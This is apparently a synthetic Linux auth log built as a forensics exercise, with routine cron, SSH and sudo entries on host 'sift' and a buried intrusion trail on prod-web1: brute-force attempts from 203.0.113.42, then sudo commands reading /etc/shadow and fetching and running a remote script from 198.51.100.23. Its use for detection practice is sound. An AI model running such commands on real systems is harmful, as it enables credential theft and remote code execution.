Mar 15 14:01:35 sift sshd[13768]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 09:31:12 sift systemd[1]: Started Session 264 of User developer.
Mar 15 14:40:40 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:00:16 sift sshd[7931]: Accepted publickey for intern1 from 10.0.1.67 port 60668 ssh2: RSA SHA256:rnd
Mar 15 08:37:50 sift CRON[29450]: pam_unix(cron:session): session closed for user root
Mar 15 14:04:57 sift sshd[1123]: Accepted publickey for guest from 10.0.1.22 port 61725 ssh2: RSA SHA256:rnd
Mar 15 08:13:14 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:31:06 sift CRON[8838]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:07:27 sift CRON[4808]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:09:44 sift CRON[9178]: pam_unix(cron:session): session closed for user root
Mar 15 09:31:56 sift CRON[23026]: pam_unix(cron:session): session closed for user root
Mar 15 10:45:14 sift systemd[1]: Started Session 157 of User developer.
Mar 15 11:03:40 sift systemd-logind[26910]: New session 465 of user admin.
Mar 15 14:05:00 prod-web1 sshd[12345]: Invalid user admin from 203.0.113.42 port 44512
Mar 15 13:04:37 sift CRON[15201]: pam_unix(cron:session): session closed for user root
Mar 15 11:56:38 sift systemd[1]: Started Session 299 of User guest.
Mar 15 11:16:51 sift CRON[18059]: pam_unix(cron:session): session closed for user root
Mar 15 14:02:03 sift CRON[11626]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:01:02 sift sshd[8677]: Accepted publickey for manager from 10.0.1.118 port 45164 ssh2: RSA SHA256:rnd
Mar 15 11:20:01 sift CRON[27840]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:43:35 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:28:10 sift CRON[26222]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:37:22 sift sshd[6221]: Accepted publickey for intern2 from 10.0.1.52 port 44236 ssh2: RSA SHA256:rnd
Mar 15 13:16:52 sift CRON[4516]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 09:34:18 sift systemd[1]: Started Session 308 of User intern1.
Mar 15 12:17:24 sift CRON[16455]: pam_unix(cron:session): session closed for user root
Mar 15 08:50:59 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:36:13 sift CRON[1505]: pam_unix(cron:session): session closed for user root
Mar 15 13:44:17 sift CRON[21145]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:21:20 sift sshd[28327]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 11:25:03 sift CRON[24964]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:52:19 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:04:41 sift CRON[27807]: pam_unix(cron:session): session closed for user root
Mar 15 13:41:47 sift sshd[27918]: Accepted publickey for guest from 10.0.1.171 port 47353 ssh2: RSA SHA256:rnd
Mar 15 11:10:06 sift CRON[6693]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 09:17:10 sift sshd[20097]: Accepted publickey for analyst from 10.0.1.23 port 43902 ssh2: RSA SHA256:rnd
Mar 15 12:22:14 sift CRON[25675]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:21:52 sift sshd[18815]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 14:23:02 sift systemd-logind[1754]: New session 444 of user manager.
Mar 15 09:06:03 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:54:52 sift sshd[10856]: Accepted publickey for intern1 from 10.0.1.135 port 57085 ssh2: RSA SHA256:rnd
Mar 15 11:29:50 sift systemd-logind[27648]: New session 74 of user guest.
Mar 15 11:28:01 sift CRON[25164]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:52:44 sift CRON[15852]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:07:38 sift systemd[1]: Started Session 174 of User guest.
Mar 15 15:20:29 sift systemd[1]: Started Session 497 of User admin.
Mar 15 12:07:03 sift sshd[8174]: pam_unix(sshd:session): session opened for user guest by (uid=0)
Mar 15 14:05:02 prod-web1 sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 44512 ssh2
Mar 15 10:12:09 sift sshd[10920]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 14:48:42 sift sshd[13712]: Accepted publickey for guest from 10.0.1.46 port 40307 ssh2: RSA SHA256:rnd
Mar 15 09:14:21 sift systemd[1]: Started Session 441 of User intern1.
Mar 15 09:06:30 sift CRON[8915]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:58:00 sift CRON[15228]: pam_unix(cron:session): session closed for user root
Mar 15 13:32:44 sift CRON[7127]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:59:04 sift CRON[20163]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:37:56 sift CRON[24282]: pam_unix(cron:session): session closed for user root
Mar 15 15:48:27 sift sshd[21666]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 12:52:41 sift systemd-logind[13835]: New session 406 of user analyst.
Mar 15 11:36:24 sift systemd[1]: Started Session 285 of User manager.
Mar 15 11:42:31 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:48:36 sift systemd[1]: Started Session 426 of User analyst.
Mar 15 14:12:20 sift sshd[20539]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 12:52:26 sift CRON[3642]: pam_unix(cron:session): session closed for user root
Mar 15 12:30:28 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:21:51 sift CRON[17247]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:40:07 sift sshd[20114]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 12:49:38 sift sshd[18285]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 08:39:37 sift sshd[14423]: Accepted publickey for intern1 from 10.0.1.98 port 61111 ssh2: RSA SHA256:rnd
Mar 15 13:45:55 sift sshd[23832]: Accepted publickey for intern2 from 10.0.1.113 port 48789 ssh2: RSA SHA256:rnd
Mar 15 14:30:45 sift systemd[1]: Started Session 342 of User intern1.
Mar 15 12:56:26 sift CRON[26189]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:09:52 sift sshd[21678]: Accepted publickey for intern1 from 10.0.1.76 port 42901 ssh2: RSA SHA256:rnd
Mar 15 08:05:13 sift sshd[20647]: Accepted publickey for manager from 10.0.1.24 port 47113 ssh2: RSA SHA256:rnd
Mar 15 13:44:12 sift systemd[1]: Started Session 306 of User manager.
Mar 15 13:16:37 sift sshd[2326]: Accepted publickey for intern1 from 10.0.1.119 port 54666 ssh2: RSA SHA256:rnd
Mar 15 09:42:13 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:55:44 sift systemd-logind[11245]: New session 204 of user manager.
Mar 15 08:51:16 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 11:24:14 sift systemd-logind[17943]: New session 409 of user manager.
Mar 15 11:27:34 sift sshd[10450]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 12:36:54 sift CRON[28619]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:54:53 sift sshd[25885]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 11:19:23 sift CRON[2036]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:09:42 sift CRON[26989]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:36:54 sift CRON[2857]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:51:57 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:51:24 sift CRON[20091]: pam_unix(cron:session): session closed for user root
Mar 15 11:18:39 sift systemd[1]: Started Session 128 of User manager.
Mar 15 09:21:36 sift CRON[15456]: pam_unix(cron:session): session closed for user root
Mar 15 14:05:11 prod-web1 sshd[12347]: Invalid user test from 203.0.113.42 port 44522
Mar 15 09:00:00 prod-web1 sshd[9000]: Accepted password for ops-team from 10.0.0.100 port 51234 ssh2
Mar 15 13:25:35 sift systemd-logind[21355]: New session 246 of user manager.
Mar 15 11:13:37 sift systemd-logind[15373]: New session 134 of user guest.
Mar 15 09:06:35 sift CRON[11009]: pam_unix(cron:session): session closed for user root
Mar 15 08:59:09 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:05:05 prod-web1 sshd[12346]: Invalid user root from 203.0.113.42 port 44518
Mar 15 11:53:50 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:28:59 sift systemd-logind[18286]: New session 441 of user intern2.
Mar 15 09:54:11 sift systemd-logind[12736]: New session 419 of user intern1.
Mar 15 08:43:28 sift systemd[1]: Started Session 16 of User intern2.
Mar 15 08:40:35 sift CRON[5066]: pam_unix(cron:session): session closed for user root
Mar 15 09:25:43 sift sshd[17200]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 15:58:27 sift CRON[4551]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:53:45 sift sshd[29885]: Accepted publickey for guest from 10.0.1.154 port 48653 ssh2: RSA SHA256:rnd
Mar 15 08:31:37 sift CRON[17456]: pam_unix(cron:session): session closed for user root
Mar 15 12:10:52 sift systemd-logind[13608]: New session 249 of user admin.
Mar 15 10:24:31 sift sshd[3326]: Accepted publickey for guest from 10.0.1.184 port 61914 ssh2: RSA SHA256:rnd
Mar 15 10:36:02 sift CRON[2934]: pam_unix(cron:session): session closed for user root
Mar 15 10:32:57 sift sshd[29365]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 14:39:12 sift sshd[25615]: Accepted publickey for guest from 10.0.1.168 port 58120 ssh2: RSA SHA256:rnd
Mar 15 10:54:09 sift sshd[2269]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 08:50:37 sift sshd[12893]: Accepted publickey for manager from 10.0.1.17 port 57959 ssh2: RSA SHA256:rnd
Mar 15 13:30:03 sift systemd-logind[13379]: New session 426 of user developer.
Mar 15 13:25:48 sift systemd[1]: Started Session 155 of User intern2.
Mar 15 09:58:50 sift systemd[1]: Started Session 318 of User analyst.
Mar 15 08:02:21 sift sshd[8017]: Accepted publickey for intern2 from 10.0.1.135 port 40700 ssh2: RSA SHA256:rnd
Mar 15 08:56:19 sift CRON[27822]: pam_unix(cron:session): session closed for user root
Mar 15 11:26:02 sift CRON[12723]: pam_unix(cron:session): session closed for user root
Mar 15 12:40:01 sift CRON[26445]: pam_unix(cron:session): session closed for user root
Mar 15 13:57:14 sift sshd[1189]: Accepted publickey for guest from 10.0.1.56 port 46842 ssh2: RSA SHA256:rnd
Mar 15 11:15:46 sift systemd-logind[15117]: New session 454 of user admin.
Mar 15 13:10:40 sift systemd-logind[14200]: New session 451 of user analyst.
Mar 15 13:14:55 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 11:30:32 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:52:32 sift sshd[13901]: Accepted publickey for guest from 10.0.1.80 port 64209 ssh2: RSA SHA256:rnd
Mar 15 13:37:27 sift sshd[23606]: Accepted publickey for analyst from 10.0.1.119 port 63985 ssh2: RSA SHA256:rnd
Mar 15 12:29:54 sift CRON[28779]: pam_unix(cron:session): session closed for user root
Mar 15 12:08:20 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:46:25 sift systemd[1]: Started Session 494 of User developer.
Mar 15 09:20:22 sift CRON[5626]: pam_unix(cron:session): session closed for user root
Mar 15 11:21:06 sift systemd[1]: Started Session 162 of User intern2.
Mar 15 12:51:34 sift sshd[9701]: Accepted publickey for intern1 from 10.0.1.88 port 56825 ssh2: RSA SHA256:rnd
Mar 15 12:00:21 sift sshd[15053]: Accepted publickey for intern2 from 10.0.1.31 port 41495 ssh2: RSA SHA256:rnd
Mar 15 11:30:38 sift sshd[25390]: Accepted publickey for admin from 10.0.1.29 port 51842 ssh2: RSA SHA256:rnd
Mar 15 11:52:54 sift systemd[1]: Started Session 18 of User intern1.
Mar 15 12:55:42 sift CRON[27325]: pam_unix(cron:session): session closed for user root
Mar 15 13:31:28 sift CRON[22116]: pam_unix(cron:session): session closed for user root
Mar 15 10:28:45 sift sshd[26960]: Accepted publickey for intern1 from 10.0.1.125 port 56211 ssh2: RSA SHA256:rnd
Mar 15 12:57:27 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:56:27 sift sshd[10388]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 13:03:32 sift sshd[23269]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 15:32:38 sift systemd-logind[22938]: New session 151 of user developer.
Mar 15 08:11:14 sift systemd-logind[8715]: New session 298 of user admin.
Mar 15 12:15:11 sift sshd[20304]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 08:24:38 sift sshd[22361]: Accepted publickey for manager from 10.0.1.72 port 59508 ssh2: RSA SHA256:rnd
Mar 15 13:37:36 sift CRON[3279]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:47:37 sift sshd[25103]: Accepted publickey for analyst from 10.0.1.63 port 48583 ssh2: RSA SHA256:rnd
Mar 15 11:52:18 sift CRON[8668]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:31:27 sift CRON[8103]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:34:00 sift systemd[1]: Started Session 362 of User admin.
Mar 15 11:11:55 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 11:50:47 sift sshd[16606]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 09:40:04 sift sshd[20250]: Accepted publickey for intern1 from 10.0.1.123 port 52484 ssh2: RSA SHA256:rnd
Mar 15 10:58:56 sift CRON[26905]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:59:04 sift systemd-logind[11404]: New session 301 of user intern2.
Mar 15 12:35:29 sift CRON[3759]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:45:08 sift systemd-logind[22731]: New session 178 of user intern1.
Mar 15 14:10:00 prod-web1 su: (to root) analyst on pts/0
Mar 15 12:38:46 sift systemd[1]: Started Session 337 of User intern1.
Mar 15 14:48:42 sift systemd-logind[12682]: New session 378 of user guest.
Mar 15 12:12:07 sift sshd[22945]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 12:24:27 sift CRON[20906]: pam_unix(cron:session): session closed for user root
Mar 15 13:02:40 sift systemd-logind[6247]: New session 481 of user intern2.
Mar 15 12:18:58 sift sshd[3750]: Accepted publickey for admin from 10.0.1.129 port 55774 ssh2: RSA SHA256:rnd
Mar 15 11:19:37 sift CRON[9938]: pam_unix(cron:session): session closed for user root
Mar 15 08:54:37 sift systemd[1]: Started Session 154 of User guest.
Mar 15 14:05:25 prod-web1 sshd[12349]: Failed password for analyst from 203.0.113.42 port 44532 ssh2
Mar 15 14:07:15 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.23/s.sh
Mar 15 11:39:38 sift systemd-logind[7561]: New session 248 of user analyst.
Mar 15 14:29:03 sift systemd-logind[3152]: New session 243 of user admin.
Mar 15 13:14:16 sift systemd[1]: Started Session 41 of User analyst.
Mar 15 13:06:48 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:46:00 sift systemd[1]: Started Session 374 of User intern1.
Mar 15 08:27:35 sift CRON[19303]: pam_unix(cron:session): session closed for user root
Mar 15 15:34:20 sift sshd[25450]: Accepted publickey for developer from 10.0.1.27 port 49112 ssh2: RSA SHA256:rnd
Mar 15 08:35:11 sift systemd[1]: Started Session 148 of User developer.
Mar 15 12:12:14 sift systemd[1]: Started Session 426 of User intern1.
Mar 15 14:20:18 sift sshd[20862]: Accepted publickey for intern2 from 10.0.1.199 port 61739 ssh2: RSA SHA256:rnd
Mar 15 14:43:49 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:58:02 sift systemd-logind[20437]: New session 93 of user guest.
Mar 15 11:02:34 sift systemd-logind[28001]: New session 426 of user manager.
Mar 15 15:56:47 sift sshd[12921]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 13:37:59 sift sshd[11605]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 10:23:36 sift systemd[1]: Started Session 338 of User developer.
Mar 15 09:14:50 sift sshd[1528]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 10:42:55 sift systemd-logind[15773]: New session 178 of user admin.
Mar 15 14:05:35 prod-web1 sshd[12350]: Accepted publickey for analyst from 203.0.113.42 port 44540 ssh2: RSA SHA256:abcdef
Mar 15 15:40:31 sift systemd-logind[11867]: New session 342 of user intern1.
Mar 15 10:29:56 sift CRON[19308]: pam_unix(cron:session): session closed for user root
Mar 15 14:05:07 prod-web1 sshd[12346]: Failed password for invalid user root from 203.0.113.42 port 44518 ssh2
Mar 15 12:46:31 sift CRON[5101]: pam_unix(cron:session): session closed for user root
Mar 15 09:05:56 sift systemd-logind[18549]: New session 46 of user manager.
Mar 15 08:42:06 sift sshd[26692]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 12:45:13 sift systemd-logind[8320]: New session 453 of user analyst.
Mar 15 08:15:26 sift systemd[1]: Started Session 120 of User guest.
Mar 15 13:56:46 sift systemd[1]: Started Session 430 of User guest.
Mar 15 09:21:23 sift systemd[1]: Started Session 108 of User manager.
Mar 15 12:19:28 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:32:32 sift CRON[16070]: pam_unix(cron:session): session closed for user root
Mar 15 12:44:52 sift CRON[14669]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 09:31:38 sift sshd[20106]: Accepted publickey for analyst from 10.0.1.2 port 52925 ssh2: RSA SHA256:rnd
Mar 15 08:26:31 sift sshd[12294]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 11:05:04 sift CRON[12542]: pam_unix(cron:session): session closed for user root
Mar 15 08:48:09 sift systemd-logind[13179]: New session 382 of user developer.
Mar 15 11:53:48 sift sshd[4195]: Accepted publickey for analyst from 10.0.1.141 port 42548 ssh2: RSA SHA256:rnd
Mar 15 12:21:33 sift CRON[29528]: pam_unix(cron:session): session closed for user root
Mar 15 08:51:15 sift sshd[19402]: Accepted publickey for guest from 10.0.1.159 port 51569 ssh2: RSA SHA256:rnd
Mar 15 09:24:55 sift systemd-logind[7542]: New session 357 of user developer.
Mar 15 10:51:40 sift CRON[10987]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:00:09 sift systemd[1]: Started Session 220 of User developer.
Mar 15 10:34:31 sift CRON[27684]: pam_unix(cron:session): session closed for user root
Mar 15 09:05:08 sift sshd[16645]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 08:08:10 sift systemd[1]: Started Session 173 of User analyst.
Mar 15 12:36:06 sift CRON[26166]: pam_unix(cron:session): session closed for user root
Mar 15 14:26:12 sift CRON[29300]: pam_unix(cron:session): session closed for user root
Mar 15 13:40:20 sift sshd[3158]: Accepted publickey for analyst from 10.0.1.86 port 58674 ssh2: RSA SHA256:rnd
Mar 15 14:07:08 sift systemd-logind[3850]: New session 493 of user intern1.
Mar 15 08:32:41 sift CRON[14053]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:04:42 sift systemd-logind[7659]: New session 386 of user guest.
Mar 15 13:45:00 sift sshd[2100]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 15:34:00 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:33:35 sift sshd[6515]: Accepted publickey for developer from 10.0.1.101 port 40379 ssh2: RSA SHA256:rnd
Mar 15 12:07:50 sift sshd[3135]: Accepted publickey for intern1 from 10.0.1.55 port 62675 ssh2: RSA SHA256:rnd
Mar 15 09:25:41 sift sshd[13809]: pam_unix(sshd:session): session opened for user intern1 by (uid=0)
Mar 15 11:50:41 sift CRON[13214]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:49:22 sift systemd-logind[15134]: New session 351 of user intern1.
Mar 15 13:58:55 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:14:10 sift sshd[7852]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 14:02:22 sift CRON[29605]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 12:16:43 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 11:06:48 sift sshd[4063]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 14:01:38 sift CRON[29710]: pam_unix(cron:session): session closed for user root
Mar 15 12:07:42 sift sshd[23857]: Accepted publickey for manager from 10.0.1.27 port 50209 ssh2: RSA SHA256:rnd
Mar 15 14:30:06 sift sshd[11950]: Accepted publickey for developer from 10.0.1.53 port 46017 ssh2: RSA SHA256:rnd
Mar 15 15:42:32 sift systemd[1]: Started Session 211 of User guest.
Mar 15 14:14:12 sift sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:46:08 sift systemd[1]: Started Session 136 of User admin.
Mar 15 09:44:56 sift sshd[4290]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 12:41:20 sift CRON[20117]: pam_unix(cron:session): session closed for user root
Mar 15 13:46:18 sift sshd[6280]: Accepted publickey for admin from 10.0.1.75 port 60347 ssh2: RSA SHA256:rnd
Mar 15 13:00:03 sift CRON[4726]: pam_unix(cron:session): session closed for user root
Mar 15 13:05:54 sift CRON[4734]: pam_unix(cron:session): session closed for user root
Mar 15 10:33:58 sift systemd-logind[3287]: New session 383 of user developer.
Mar 15 13:00:09 sift CRON[19106]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 10:36:56 sift systemd[1]: Started Session 281 of User manager.
Mar 15 08:04:19 sift sshd[28432]: Accepted publickey for guest from 10.0.1.125 port 41710 ssh2: RSA SHA256:rnd
Mar 15 09:08:43 sift CRON[19094]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 08:17:34 sift sshd[25620]: pam_unix(sshd:session): session opened for user guest by (uid=0)
Mar 15 14:22:04 sift sshd[9818]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 11:04:45 sift sshd[28228]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 15:27:12 sift sshd[11022]: Accepted publickey for developer from 10.0.1.31 port 61627 ssh2: RSA SHA256:rnd
Mar 15 08:39:20 sift sshd[19909]: Accepted publickey for analyst from 10.0.1.58 port 50039 ssh2: RSA SHA256:rnd
Mar 15 11:44:57 sift systemd-logind[24476]: New session 6 of user admin.
Mar 15 08:34:28 sift systemd[1]: Started Session 242 of User manager.
Mar 15 13:26:56 sift systemd-logind[28090]: New session 470 of user manager.
Mar 15 11:08:43 sift systemd-logind[1696]: New session 437 of user intern1.
Mar 15 14:56:08 sift systemd-logind[21479]: New session 400 of user manager.
Mar 15 15:21:48 sift CRON[25829]: pam_unix(cron:session): session closed for user root
Mar 15 09:42:01 sift systemd[1]: Started Session 456 of User analyst.
Mar 15 14:27:20 sift systemd-logind[22382]: New session 177 of user developer.
Mar 15 12:26:08 sift sshd[26307]: Accepted publickey for guest from 10.0.1.185 port 64273 ssh2: RSA SHA256:rnd
Mar 15 15:33:40 sift systemd-logind[10004]: New session 490 of user developer.
Mar 15 11:01:24 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:34:18 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:49:58 sift CRON[27270]: pam_unix(cron:session): session closed for user root
Mar 15 14:54:48 sift sshd[8294]: pam_unix(sshd:session): session opened for user intern2 by (uid=0)
Mar 15 14:07:00 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow
Mar 15 08:21:42 sift sshd[16184]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Mar 15 09:28:38 sift sshd[10131]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
Mar 15 13:01:54 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 09:21:23 sift sshd[22119]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 08:21:14 sift CRON[20796]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 15:19:13 sift sudo: guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:01:16 sift CRON[18872]: pam_unix(cron:session): session closed for user root
Mar 15 09:53:10 sift systemd[1]: Started Session 60 of User developer.
Mar 15 08:59:42 sift sshd[23055]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 12:20:43 sift systemd[1]: Started Session 470 of User intern1.
Mar 15 13:17:53 sift systemd[1]: Started Session 8 of User analyst.
Mar 15 08:28:48 sift sshd[4611]: Accepted publickey for analyst from 10.0.1.138 port 60223 ssh2: RSA SHA256:rnd
Mar 15 11:31:12 sift systemd-logind[9711]: New session 395 of user intern2.
Mar 15 12:02:51 sift sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 14:05:13 prod-web1 sshd[12347]: Failed password for invalid user test from 203.0.113.42 port 44522 ssh2
Mar 15 13:58:52 sift CRON[19327]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 13:42:27 sift sshd[11155]: Accepted publickey for analyst from 10.0.1.122 port 40865 ssh2: RSA SHA256:rnd
Mar 15 12:09:46 sift sshd[7967]: Accepted publickey for developer from 10.0.1.53 port 63506 ssh2: RSA SHA256:rnd
Mar 15 13:07:49 sift sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 13:13:24 sift sshd[20967]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 08:00:17 sift systemd[1]: Started Session 269 of User manager.
Mar 15 08:20:00 sift sudo: manager : TTY=pts/0 ; PWD=/home/manager ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 15:09:46 sift CRON[16558]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 14:07:30 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/s.sh
Mar 15 08:39:53 sift CRON[20595]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 11:30:32 sift sshd[18949]: pam_unix(sshd:session): session opened for user developer by (uid=0)
Mar 15 15:14:24 sift systemd-logind[4507]: New session 486 of user analyst.
Mar 15 13:56:09 sift CRON[6929]: pam_unix(cron:session): session closed for user root
Mar 15 08:47:18 sift systemd-logind[16987]: New session 62 of user admin.
Mar 15 11:49:40 sift systemd[1]: Started Session 10 of User guest.
Mar 15 15:03:55 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 08:20:32 sift systemd-logind[12909]: New session 451 of user guest.
Mar 15 15:50:50 sift sshd[26268]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 08:11:09 sift sshd[13587]: pam_unix(sshd:session): session opened for user manager by (uid=0)
Mar 15 09:10:34 sift systemd-logind[10080]: New session 445 of user analyst.
Mar 15 08:42:30 sift systemd-logind[3864]: New session 115 of user admin.
Mar 15 14:05:50 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:20:07 sift sudo: intern2 : TTY=pts/0 ; PWD=/home/intern2 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 12:52:37 sift sudo: intern1 : TTY=pts/0 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/apt update
Mar 15 10:51:41 sift systemd[1]: Started Session 405 of User manager.
Mar 15 09:45:47 sift CRON[5741]: pam_unix(cron:session): session opened for user root by (uid=0)
